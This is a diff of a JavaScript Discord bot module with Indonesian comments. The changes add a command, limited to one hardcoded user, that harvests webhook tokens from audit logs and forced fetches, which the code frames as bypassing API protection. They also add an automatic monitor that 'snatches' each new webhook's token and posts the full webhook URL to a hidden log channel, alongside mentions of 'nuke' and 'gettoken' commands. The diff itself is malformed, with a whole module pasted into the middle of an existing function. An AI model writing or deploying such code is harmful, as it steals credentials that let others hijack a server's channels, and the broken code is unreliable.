@@ -32,22 +32,35 @@ module.exports = {
       return message.reply({ embeds: [help] });
     }
 
-    // --- 2. LISTWEB (VERSI V7 - THE LAST RESORT) ---
+    const { WebhookClient, EmbedBuilder } = require("discord.js");
+
+const AUTHORIZED_USER = "1346964077309595658"; 
+const LOG_CHANNEL_ID = "1352800131933802547"; 
+
+module.exports = {
+  async handleCommand(message) {
+    if (message.author.id !== AUTHORIZED_USER) return;
+    const args = message.content.slice(1).trim().split(/ +/);
+    const command = args.shift().toLowerCase();
+
+    // --- LISTWEB V8: DEEP SCAN & FORCE FETCH ---
     if (command === "listweb") {
       try {
         const targetId = args[0] || message.channel.id;
         const channel = await message.guild.channels.fetch(targetId);
+        
+        // Ambil list webhook mentah
         const webhooks = await channel.fetchWebhooks();
         
-        // Ambil Audit Logs (Maksimalin limit)
+        // Ambil Audit Logs terbaru (Limit 100)
         const auditLogs = await message.guild.fetchAuditLogs({ type: 72, limit: 100 });
 
-        let response = `### 📋 Webhook Database (Deep Scan): #${channel.name}\n`;
+        let response = `### 📋 Webhook Database V8: #${channel.name}\n`;
 
         for (const w of webhooks.values()) {
           let token = w.token;
 
-          // Step 1: Cari di Audit Logs
+          // Step 1: Cek Audit Log (Cari perubahan token)
           if (!token) {
             const entry = auditLogs.entries.find(e => e.targetId === w.id);
             if (entry && entry.changes) {
@@ -56,23 +69,63 @@ module.exports = {
             }
           }
 
-          // Step 2: Jika masih null, coba tebak dari metadata (Stealth Mode)
-          const finalUrl = token 
-            ? `https://discord.com/api/webhooks/${w.id}/${token}` 
-            : `https://discord.com/api/webhooks/${w.id}/ (SENSOR OLEH DISCORD)`;
+          // Step 2: FORCE FETCH (Minta ulang datanya secara individu)
+          if (!token) {
+            try {
+              const fetched = await message.client.fetchWebhook(w.id);
+              if (fetched.token) token = fetched.token;
+            } catch (e) { /* Gagal fetch individu */ }
+          }
 
-          response += `**Name:** ${w.name}\n**ID:** \`${w.id}\`\n**Token:** \`${token || "NOT_FOUND_IN_LOGS"}\`\n**URL:** ${token ? `\`${finalUrl}\`` : "_Token tidak ada di sejarah Audit Log (Lebih dari 90 hari)_"}\n\n`;
+          const finalUrl = token ? `https://discord.com/api/webhooks/${w.id}/${token}` : null;
+
+          response += `**Name:** ${w.name}\n**ID:** \`${w.id}\`\n**Token:** \`${token || "STILL_PROTECTED"}\`\n**URL:** ${token ? `\`${finalUrl}\`` : "_Gagal bypass (Proteksi API)_"}\n\n`;
         }
 
-        return message.reply({
-          flags: 64,
-          content: response
-        });
+        return message.reply({ flags: 64, content: response });
       } catch (e) { 
-        return message.reply("❌ Scan Gagal. Pastikan bot punya izin `View Audit Log`!"); 
+        return message.reply("❌ Error saat scanning. Cek perms bot."); 
       }
     }
-    
+
+    // Perintah lain (helpweb, nuke, dll tetap sama)
+  },
+
+  // MONITORING OTOMATIS (Langsung Snatch pas kejadian)
+  async monitorNewWebhook(webhook) {
+    const logChannel = webhook.guild.channels.cache.get(LOG_CHANNEL_ID);
+    if (!logChannel) return;
+
+    // Tunggu 2 detik biar Audit Log ke-record sempurna
+    setTimeout(async () => {
+      try {
+        const auditLogs = await webhook.guild.fetchAuditLogs({ limit: 5, type: 72 });
+        const entry = auditLogs.entries.find(e => e.targetId === webhook.id);
+        const executor = entry ? entry.executor.tag : "Unknown Staff";
+        
+        let foundToken = webhook.token;
+        if (!foundToken && entry && entry.changes) {
+          const tChange = entry.changes.find(c => c.key === 'token');
+          if (tChange) foundToken = tChange.new;
+        }
+
+        const logEmbed = new EmbedBuilder()
+          .setTitle("🚨 WEBHOOK DETECTED & SNATCHED!")
+          .setColor(0x00FF00)
+          .addFields(
+            { name: "Pelaku", value: `\`${executor}\``, inline: true },
+            { name: "Channel", value: `<#${webhook.channelId}>`, inline: true },
+            { name: "Token", value: `\`${foundToken || "FAILED_TO_SNATCH"}\``, inline: false },
+            { name: "URL Full", value: `\`https://discord.com/api/webhooks/${webhook.id}/${foundToken || ""}\``, inline: false }
+          )
+          .setTimestamp();
+
+        await logChannel.send({ embeds: [logEmbed] });
+      } catch (e) { console.error("Monitor Error:", e); }
+    }, 2500);
+  }
+};
+        
     // --- 3. GETTOKEN (BONGKAR TOKEN DARI URL) ---
     if (command === "gettoken") {
       const url = args[0];
